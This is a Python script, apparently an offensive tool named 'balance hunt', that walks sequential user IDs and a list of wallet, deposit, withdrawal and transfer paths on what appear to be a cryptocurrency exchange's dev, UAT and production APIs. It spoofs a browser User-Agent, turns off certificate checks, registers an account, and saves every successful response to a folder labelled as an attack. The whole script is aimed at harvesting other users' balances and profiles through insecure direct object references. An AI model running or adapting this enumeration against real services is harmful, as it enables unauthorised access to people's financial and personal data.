import requests, json, sys, urllib3, os, concurrent.futures
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

S = requests.Session()
S.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
})
T = 15

def safe(t, n=400):
    return t[:n].encode('ascii','replace').decode('ascii') if t else ""

def hit(method, url, data=None):
    try:
        if method == "GET":
            r = S.get(url, timeout=T, verify=False)
        elif method == "POST":
            r = S.post(url, json=data, timeout=T, verify=False)
        elif method == "PUT":
            r = S.put(url, json=data, timeout=T, verify=False)
        else:
            return None
        return r
    except:
        return None

ACCT = "https://accounthkdev.mx.exchange"
WALLET = "https://wallethkdev.mx.exchange"
UAT = "https://openapiuat.azurewebsites.net"

hits = []

print("=" * 70)
print("MX EXCHANGE — BALANCE HUNT")
print("=" * 70)

# 1. Account API Balance endpoints (IDs 1-20)
print("\n[ACCOUNT HK DEV] /api/Users/Balance/{id}")
for uid in range(1, 21):
    r = hit("GET", f"{ACCT}/api/Users/Balance/{uid}")
    if r:
        print(f"  id={uid:3d} => {r.status_code} ({len(r.text)}b) {safe(r.text,300)}")
        if r.status_code == 200 and r.text and len(r.text) > 2:
            hits.append(("acct_balance", uid, r.text))
    else:
        print(f"  id={uid:3d} => TIMEOUT/ERROR")

# 2. Account API User profiles (IDs 1-10)
print("\n[ACCOUNT HK DEV] /api/Users/{id}")
for uid in range(1, 11):
    r = hit("GET", f"{ACCT}/api/Users/{uid}")
    if r:
        print(f"  id={uid:3d} => {r.status_code} ({len(r.text)}b) {safe(r.text,300)}")
        if r.status_code == 200 and r.text and len(r.text) > 2:
            hits.append(("user_profile", uid, r.text))

# 3. Account API Profile via Account path
print("\n[ACCOUNT HK DEV] /api/Account/{id}/Profile")
for uid in range(1, 11):
    r = hit("GET", f"{ACCT}/api/Account/{uid}/Profile")
    if r:
        print(f"  id={uid:3d} => {r.status_code} ({len(r.text)}b) {safe(r.text,300)}")
        if r.status_code == 200 and r.text and len(r.text) > 2:
            hits.append(("profile", uid, r.text))

# 4. Wallet API endpoints
print("\n[WALLET HK DEV] Various paths")
wallet_tests = [
    "/api/Wallet",
    "/api/Wallet/1", "/api/Wallet/2", "/api/Wallet/3",
    "/api/Wallet/Balance", "/api/Wallet/Balance/1",
    "/api/Currency", "/api/Currency/1", "/api/Currency/2",
    "/api/Address", "/api/Address/1",
    "/api/Deposit", "/api/Deposit/1",
    "/api/Withdrawal", "/api/Withdrawal/1",
    "/api/Transfer", "/api/Transfer/1",
    "/api/WalletAddress", "/api/WalletAddress/1",
    "/api/FiatWithdrawal", "/api/FiatWithdrawal/1",
    "/api/FiatDeposit", "/api/FiatDeposit/1",
    "/api/CryptoDeposit", "/api/CryptoDeposit/1",
    "/api/CryptoWithdrawal", "/api/CryptoWithdrawal/1",
    "/api/DeepFreezeAddress",
    "/api/InternalTransfer", "/api/InternalTransfer/1",
]
for path in wallet_tests:
    r = hit("GET", f"{WALLET}{path}")
    if r:
        tag = "!!!" if r.status_code in (200,201,204) else r.status_code
        print(f"  [{tag}] GET {path} => {r.status_code} ({len(r.text)}b) {safe(r.text,200)}")
        if r.status_code in (200,201,204) and r.text and len(r.text) > 2:
            hits.append(("wallet", path, r.text))

# 5. UAT Balance  
print("\n[UAT] Balance endpoints")
uat_tests = [
    "/api/1/user/balance",
    "/api/1/user/wallet",
    "/api/1/user/wallets",
    "/api/1/user/account",
    "/api/1/user/profile",
    "/api/1/user/deposit",
    "/api/1/user/withdrawal",
    "/api/1/user/orders",
    "/api/1/user/trades",
    "/api/1/ticker?pair=BTCMYR",
    "/api/1/ticker/all",
    "/api/1/orderbook?pair=BTCMYR",
    "/api/1/marketpair",
    "/api/1/marketpair/active",
    "/api/1/currency",
    "/api/1/currency/active",
]
for path in uat_tests:
    r = hit("GET", f"{UAT}{path}")
    if r:
        tag = "!!!" if r.status_code in (200,201,204) else r.status_code
        print(f"  [{tag}] GET {path} => {r.status_code} ({len(r.text)}b) {safe(r.text,300)}")
        if r.status_code in (200,201,204) and r.text and len(r.text) > 2:
            hits.append(("uat", path, r.text))

# 6. PROD public endpoints (no HMAC needed for public)
print("\n[PROD] Public market data")
PROD = "https://openapi.mx.exchange"
prod_tests = [
    "/api/1/ticker?pair=BTCMYR",
    "/api/1/ticker/all",  
    "/api/1/orderbook?pair=BTCMYR",
    "/api/1/marketpair",
    "/api/1/marketpair/active",
    "/api/1/currency",
    "/api/1/currency/active",
    "/api/1/trade?pair=BTCMYR",
]
for path in prod_tests:
    r = hit("GET", f"{PROD}{path}")
    if r:
        tag = "!!!" if r.status_code in (200,201,204) else r.status_code
        print(f"  [{tag}] GET {path} => {r.status_code} ({len(r.text)}b) {safe(r.text,300)}")
        if r.status_code in (200,201,204) and r.text and len(r.text) > 2:
            hits.append(("prod", path, r.text))

# 7. REGISTER on HK Dev (retry with verbose)
print("\n[REGISTER] HK Dev Account...")
for acct_type in [0, 1]:
    payload = {
        "name": "Marcos Herrera",
        "email": "marcos.herrera.dev@gmail.com",
        "password": "MxTest2026!@#",
        "confirmPassword": "MxTest2026!@#",
        "country": 1,
        "accountType": acct_type,
    }
    try:
        r = requests.post(f"{ACCT}/api/Account/Register", json=payload, timeout=30, verify=False,
                         headers={"Content-Type":"application/json","Accept":"application/json",
                                  "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        print(f"  type={acct_type} => {r.status_code} ({len(r.text)}b) headers={dict(r.headers)}")
        print(f"  body: {safe(r.text, 500)}")
        if r.status_code in (200,201):
            hits.append(("register", acct_type, r.text))
    except Exception as e:
        print(f"  type={acct_type} => ERROR: {e}")

# Save
with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\balance_hunt_results.json", "w") as f:
    json.dump([{"type": h[0], "key": str(h[1]), "data": h[2][:5000]} for h in hits], f, indent=2, ensure_ascii=True)

print(f"\n{'='*70}")
print(f"TOTAL HITS: {len(hits)}")
print("=" * 70)
